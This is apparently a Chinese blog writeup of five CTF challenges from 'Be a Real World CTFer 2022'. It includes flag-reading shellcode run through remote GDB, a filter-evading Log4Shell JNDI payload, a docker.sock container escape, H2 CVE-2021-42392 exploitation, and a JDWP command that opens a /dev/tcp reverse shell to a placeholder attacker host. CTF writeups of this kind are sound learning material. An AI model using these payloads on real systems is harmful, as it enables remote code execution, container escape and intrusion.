---
title: Be a Real World CTFer 2022 体验赛部分题目 writeup
date: 2022-01-23 13:37:33
tags:
- ctf
---

这场比赛是体验赛，签到题较多，没有设置过多的障碍，个人完成了其中的5题

<!--more-->

## Remote Debugger

题目提供了一个远程`GDB`环境调试一个简单程序，程序内只引用了`getchar`和`putchar`所以没有办法通过`p system()`之类的手段访问容器内的`flag`。但是我们可以通过手写`shellcode`的方式替换原来的程序执行`shellcode`

我最先尝试的是传一个反弹`shell`，在本地能够跑通但一放到题目的环境上就`SIGKILL`不知道为什么

最后手写了`shellcode`将`flag`写到`[rsp]`上

```assembly
section .text
  global _start
    _start:
        push rbp
        mov rbp,rsp
        xor rdx, rdx

        push 2
        pop rax ; syscall 2 -> read(*filename, flags, mode)
        push 0
        pop rsi ; flags -> 0 RO
        push 644
        pop rdx ; mode -> 644
        sub rsp, 8
        mov dword [rsp+4], 0x067
        mov dword [rsp], 0x616c662f ; -> /flag
        lea rdi, [rsp]
        add rsp, 8
        syscall

        push rax
        pop rdi ; rdi -> file handler
        push 0
        pop rax ; sys_read(fd, buf, count)
        push 30
        pop rdx ; count -> 30
        lea rsi, [rsp] ; buf -> rsp
        syscall
    _loop:
        jmp _loop ; 防止跑过头出错
```

编译：

```sh
nasm -f elf64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode.hex
for i in `objdump -d shellcode.hex | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done
```

执行：

```sh
target remote 106.14.170.199:1234
set $rip = main
restore shellcode binary $rip # 把 shellcode 写到 main 上 （处于可执行区段即可）
// Ctrl + C
x/s $rip
```

![gdb](gdb.png)

## log4flag

这一题没有什么好说的，就是最新的`log4j`漏洞

需要注意的是给出的程序有`filter`进行简单过滤：`(\$\{jndi:)|(ldap:)|(rmi:)`

这个可以用`toLower`来绕过

直接使用`poc`：[kozmer/log4j-shell-poc: A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. (github.com)](https://github.com/kozmer/log4j-shell-poc)

构造`payload`：

```
${${lower:j}ndi:${lower:l}dap://YOURIP/a}
```

## Be-a-Docker-Escaper

观察到容器映射了`docker.sock`

所以直接在容器内开一个新的容器去`cat flag`即可

命令：

```sh
apt-get update && apt-get install -y wget # 安装工具
wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.9.tgz # 下载 docker 我们只需要里面的 docker cli 就行
tar -xf docker-20.10.9.tgz
cd docker
./docker -H unix:///s run --rm -v /root/flag:/flag alpine cat /flag # 使用映射进来的 docker.sock 操作宿主的 docker 创建新容器并映射 flag
```

![docker](docker.png)

## Be-a-Database-Hacker 2

给出了一个带版本号的`h2`直接根据`2.0.202`搜索`CVE`发现：`CVE-2021-42392`

该`CVE`有人详细分析过：

1. https://0x0021h.github.io/2022/01/10/22/index.html
2. http://www.mastertheboss.com/jbossas/jboss-datasource/what-you-need-to-know-about-cve-2021-42392/

使用和`log4flag`一样的`poc`脚本

将`Driver Class`填入`javax.naming.InitialContext`

`JDBC URL`填入`ldap://YOURIP/a`

即可获得反弹`shell`

## Java Remote Debugger

原题？[浅析常见Debug调试器的安全隐患 - 博客 - 腾讯安全应急响应中心 (tencent.com)](https://security.tencent.com/index.php/blog/msg/137)

使用脚本：https://github.com/IOActive/jdwp-shellifier

```sh
python2 ./jdwp-shellifier.py -t 139.196.23.201 -p 8888 --break-on java.lang.String.indexOf --cmd 'bash -c {echo,BASE64ENCODEDSHELLCODE}|{base64,-d}|{bash,-i}'

BASE64ENCODEDSHELLCODE => /bin/bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1
```

![shell](shell.png)
